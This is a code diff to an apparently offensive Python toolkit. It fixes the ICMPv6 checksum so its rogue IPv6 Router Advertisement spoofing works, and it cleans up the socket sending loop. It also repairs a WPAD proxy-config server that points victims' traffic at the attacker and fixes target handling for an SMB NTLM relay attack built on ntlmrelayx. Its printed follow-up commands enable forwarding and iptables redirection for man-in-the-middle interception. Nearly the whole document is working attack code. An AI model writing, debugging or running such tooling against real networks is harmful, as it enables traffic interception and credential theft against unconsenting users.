@@ -69,17 +69,36 @@ _running       = False
 # 1. IPv6 Rogue Router Advertisement
 # ══════════════════════════════════════════════════════════════════════════════
 
+def _icmpv6_checksum(packet, src_ipv6, dst_ipv6):
+    """Compute ICMPv6 checksum using IPv6 pseudo-header."""
+    try:
+        src = socket.inet_pton(socket.AF_INET6, src_ipv6)
+        dst = socket.inet_pton(socket.AF_INET6, dst_ipv6)
+    except Exception:
+        return b"\x00\x00"
+    pseudo = src + dst + struct.pack("!I", len(packet)) + b"\x00\x00\x00\x3a"
+    full = pseudo + packet
+    if len(full) % 2:
+        full += b"\x00"
+    csum = 0
+    for i in range(0, len(full), 2):
+        csum += struct.unpack("!H", full[i:i+2])[0]
+    csum = (csum >> 16) + (csum & 0xFFFF)
+    csum += csum >> 16
+    return struct.pack("!H", (~csum) & 0xFFFF)
+
+
 def _build_router_advertisement(attacker_ipv6, dns_server_ipv6=None):
     """
     Build an ICMPv6 Router Advertisement packet.
     Sets M=0 O=1 (stateless, use our DNS), prefix with 0 lifetime to invalidate
     legitimate routes, our address as default router with high preference.
     """
-    # ICMPv6 RA: type=134, code=0
+    # ICMPv6 RA: type=134, code=0 — build with checksum=0, then compute and patch
     ra  = struct.pack("!BBHBBHI",
         134,          # type: Router Advertisement
         0,            # code
-        0,            # checksum (filled later)
+        0,            # checksum placeholder — computed below
         255,          # hop limit
         0x08,         # flags: O=1 (other config — get DNS via DHCPv6)
         30,           # router lifetime (seconds) — short so we stay preferred
@@ -114,6 +133,10 @@ def _build_router_advertisement(attacker_ipv6, dns_server_ipv6=None):
                  random.randint(0,255), random.randint(0,255)])
     ra += struct.pack("!BB", 1, 1) + mac
 
+    # Patch in real ICMPv6 checksum — required or packets dropped by IPv6 stack
+    csum = _icmpv6_checksum(ra, attacker_ipv6, "ff02::1")
+    ra = ra[:2] + csum + ra[4:]
+
     return ra
 
 
@@ -147,23 +170,24 @@ def ipv6_rogue_ra(attacker_ip=None, attacker_ipv6=None, iface="eth0",
         ra_pkt = _build_router_advertisement(attacker_ipv6)
 
         sock = socket.socket(socket.AF_INET6, socket.SOCK_RAW, socket.IPPROTO_ICMPV6)
-        sock.setsockopt(socket.IPPROTO_IPV6, socket.IPV6_MULTICAST_HOPS, 255)
         try:
-            sock.setsockopt(socket.SOL_SOCKET, socket.SO_BINDTODEVICE, iface.encode())
-        except: pass
+            sock.setsockopt(socket.IPPROTO_IPV6, socket.IPV6_MULTICAST_HOPS, 255)
+            try:
+                sock.setsockopt(socket.SOL_SOCKET, socket.SO_BINDTODEVICE, iface.encode())
+            except: pass
 
-        start = time.time()
-        sent  = 0
-        while True:
-            sock.sendto(ra_pkt, (ALL_NODES, 0))
-            sent += 1
-            out.append(f"  [+] RA sent #{sent} → {ALL_NODES}")
-            if 0 < duration <= (time.time() - start):
-                break
-            time.sleep(interval)
-
-        sock.close()
-        out.append(f"[+] Sent {sent} RA packets")
+            start = time.time()
+            sent  = 0
+            while True:
+                sock.sendto(ra_pkt, (ALL_NODES, 0))
+                sent += 1
+                out.append(f"  [+] RA sent #{sent} → {ALL_NODES}")
+                if 0 < duration <= (time.time() - start):
+                    break
+                time.sleep(interval)
+            out.append(f"[+] Sent {sent} RA packets")
+        finally:
+            sock.close()
         out.append(f"[*] Enable IPv4 forwarding: echo 1 > /proc/sys/net/ipv4/ip_forward")
         out.append(f"[*] Enable IPv6 forwarding: echo 1 > /proc/sys/net/ipv6/conf/all/forwarding")
         out.append(f"[*] MitM IPv6 traffic: ip6tables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-port 8080")
@@ -200,10 +224,6 @@ class _WPADHandler(http.server.BaseHTTPRequestHandler):
 
     def do_GET(self):
         if self.path in ("/wpad.dat", "/wpad/wpad.dat", "/proxy.pac"):
-            pac = WPAD_PAC.format(
-                attacker_ip=self._WPADHandler__class__.attacker_ip if hasattr(self, "__class__") else self.attacker_ip,
-                proxy_port=self.proxy_port
-            )
             pac = WPAD_PAC.format(attacker_ip=self.server.attacker_ip,
                                   proxy_port=self.server.proxy_port)
             body = pac.encode()
@@ -291,6 +311,8 @@ def smb_relay(targets_file=None, targets=None, lhost=None,
     out = [f"[SMB Relay] NTLM relay attack"]
 
     # Find signing-disabled targets
+    tgts = []
+    targets_file = targets_file  # may be None if not passed
     if targets:
         tgts = targets
     else:
@@ -305,7 +327,6 @@ def smb_relay(targets_file=None, targets=None, lhost=None,
             )
             out.append(scan_out[:500])
             targets_file = "/tmp/relay_targets.txt"
-        tgts = []
 
     if targets_file and os.path.exists(targets_file):
         out.append(f"[+] Relay targets file: {targets_file}")
@@ -315,8 +336,8 @@ def smb_relay(targets_file=None, targets=None, lhost=None,
             f.write("\n".join(tgts))
         out.append(f"[+] Relay targets ({len(tgts)}): {', '.join(tgts[:5])}")
     else:
-        out.append("[!] No targets file — provide targets or auto-scan subnet")
-        targets_file = "/tmp/relay_targets.txt"
+        out.append("[!] No targets — provide targets list or auto-scan subnet with lhost=")
+        targets_file = None
 
     # Build ntlmrelayx command
     ntlmrelay = shutil.which("ntlmrelayx.py") or shutil.which("ntlmrelayx")
